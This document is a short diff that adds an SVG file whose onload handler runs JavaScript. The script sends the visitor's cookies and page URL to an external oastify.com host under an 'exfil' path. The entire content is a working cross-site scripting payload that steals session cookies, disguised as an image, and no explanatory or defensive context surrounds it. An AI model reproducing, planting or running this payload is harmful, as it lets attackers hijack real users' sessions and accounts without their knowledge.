@@ -1,0 +1,5 @@
+<svg onload="
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/exfil?cookies=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(window.location.href), true);
+xhr.send();
+">
